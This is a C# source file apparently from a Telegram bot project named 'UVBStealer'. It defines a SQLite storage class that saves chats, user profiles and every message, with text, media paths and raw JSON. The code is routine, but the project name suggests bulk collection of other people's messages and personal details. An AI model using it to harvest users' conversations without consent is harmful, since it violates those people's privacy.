using System.Text.Json;
using Microsoft.Data.Sqlite;
using Microsoft.Extensions.Configuration;
using Microsoft.Extensions.Logging;
using Telegram.Bot.Types;

namespace UVBStealer;

public class StorageDb
{
    private readonly string _dbPath;
    private readonly ILogger<StorageDb> _logger;

    public StorageDb(IConfiguration config, ILogger<StorageDb> logger)
    {
        _logger = logger;
        _dbPath = config.GetValue("Storage:DbPath", "data/storage.db")!;
    }

    private SqliteConnection CreateConnection()
    {
        var dir = Path.GetDirectoryName(_dbPath);
        if (!string.IsNullOrEmpty(dir))
            Directory.CreateDirectory(dir);

        var conn = new SqliteConnection($"Data Source={_dbPath}");
        conn.Open();
        return conn;
    }

    public async Task InitializeAsync()
    {
        await using var conn = CreateConnection();

        var sql = """
            CREATE TABLE IF NOT EXISTS chats (
                id INTEGER PRIMARY KEY,
                type TEXT,
                title TEXT,
                username TEXT,
                first_name TEXT,
                last_name TEXT,
                is_forum INTEGER,
                updated_at TEXT
            );

            CREATE TABLE IF NOT EXISTS users (
                id INTEGER PRIMARY KEY,
                is_bot INTEGER,
                first_name TEXT,
                last_name TEXT,
                username TEXT,
                language_code TEXT,
                is_premium INTEGER,
                updated_at TEXT
            );

            CREATE TABLE IF NOT EXISTS messages (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                message_id INTEGER NOT NULL,
                chat_id INTEGER NOT NULL,
                user_id INTEGER,
                date TEXT,
                text TEXT,
                caption TEXT,
                type TEXT,
                media_path TEXT,
                raw_json TEXT,
                FOREIGN KEY (chat_id) REFERENCES chats(id),
                FOREIGN KEY (user_id) REFERENCES users(id)
            );

            CREATE INDEX IF NOT EXISTS idx_messages_chat ON messages(chat_id);
            CREATE INDEX IF NOT EXISTS idx_messages_user ON messages(user_id);
            CREATE INDEX IF NOT EXISTS idx_messages_date ON messages(date);
            """;

        await using var cmd = conn.CreateCommand();
        cmd.CommandText = sql;
        await cmd.ExecuteNonQueryAsync();

        _logger.LogInformation("Storage database initialized at {Path}", _dbPath);
    }

    public async Task UpsertChatAsync(Chat chat)
    {
        await using var conn = CreateConnection();
        await using var cmd = conn.CreateCommand();

        cmd.CommandText = """
            INSERT INTO chats (id, type, title, username, first_name, last_name, is_forum, updated_at)
            VALUES ($id, $type, $title, $username, $first_name, $last_name, $is_forum, $updated_at)
            ON CONFLICT(id) DO UPDATE SET
                type = excluded.type,
                title = excluded.title,
                username = excluded.username,
                first_name = excluded.first_name,
                last_name = excluded.last_name,
                is_forum = excluded.is_forum,
                updated_at = excluded.updated_at
            """;

        cmd.Parameters.AddWithValue("$id", chat.Id);
        cmd.Parameters.AddWithValue("$type", chat.Type.ToString());
        cmd.Parameters.AddWithValue("$title", (object?)chat.Title ?? DBNull.Value);
        cmd.Parameters.AddWithValue("$username", (object?)chat.Username ?? DBNull.Value);
        cmd.Parameters.AddWithValue("$first_name", (object?)chat.FirstName ?? DBNull.Value);
        cmd.Parameters.AddWithValue("$last_name", (object?)chat.LastName ?? DBNull.Value);
        cmd.Parameters.AddWithValue("$is_forum", chat.IsForum == true ? 1 : 0);
        cmd.Parameters.AddWithValue("$updated_at", DateTime.UtcNow.ToString("o"));

        await cmd.ExecuteNonQueryAsync();
    }

    public async Task UpsertUserAsync(User user)
    {
        await using var conn = CreateConnection();
        await using var cmd = conn.CreateCommand();

        cmd.CommandText = """
            INSERT INTO users (id, is_bot, first_name, last_name, username, language_code, is_premium, updated_at)
            VALUES ($id, $is_bot, $first_name, $last_name, $username, $language_code, $is_premium, $updated_at)
            ON CONFLICT(id) DO UPDATE SET
                is_bot = excluded.is_bot,
                first_name = excluded.first_name,
                last_name = excluded.last_name,
                username = excluded.username,
                language_code = excluded.language_code,
                is_premium = excluded.is_premium,
                updated_at = excluded.updated_at
            """;

        cmd.Parameters.AddWithValue("$id", user.Id);
        cmd.Parameters.AddWithValue("$is_bot", user.IsBot ? 1 : 0);
        cmd.Parameters.AddWithValue("$first_name", (object?)user.FirstName ?? DBNull.Value);
        cmd.Parameters.AddWithValue("$last_name", (object?)user.LastName ?? DBNull.Value);
        cmd.Parameters.AddWithValue("$username", (object?)user.Username ?? DBNull.Value);
        cmd.Parameters.AddWithValue("$language_code", (object?)user.LanguageCode ?? DBNull.Value);
        cmd.Parameters.AddWithValue("$is_premium", user.IsPremium == true ? 1 : 0);
        cmd.Parameters.AddWithValue("$updated_at", DateTime.UtcNow.ToString("o"));

        await cmd.ExecuteNonQueryAsync();
    }

    public async Task SaveMessageAsync(Message msg, string? mediaPath)
    {
        await using var conn = CreateConnection();
        await using var cmd = conn.CreateCommand();

        var msgType = msg.Type.ToString();

        cmd.CommandText = """
            INSERT INTO messages (message_id, chat_id, user_id, date, text, caption, type, media_path, raw_json)
            VALUES ($message_id, $chat_id, $user_id, $date, $text, $caption, $type, $media_path, $raw_json)
            """;

        cmd.Parameters.AddWithValue("$message_id", msg.MessageId);
        cmd.Parameters.AddWithValue("$chat_id", msg.Chat.Id);
        cmd.Parameters.AddWithValue("$user_id", (object?)msg.From?.Id ?? DBNull.Value);
        cmd.Parameters.AddWithValue("$date", msg.Date.ToString("o"));
        cmd.Parameters.AddWithValue("$text", (object?)msg.Text ?? DBNull.Value);
        cmd.Parameters.AddWithValue("$caption", (object?)msg.Caption ?? DBNull.Value);
        cmd.Parameters.AddWithValue("$type", msgType);
        cmd.Parameters.AddWithValue("$media_path", (object?)mediaPath ?? DBNull.Value);
        cmd.Parameters.AddWithValue("$raw_json", JsonSerializer.Serialize(msg));

        await cmd.ExecuteNonQueryAsync();
    }
}
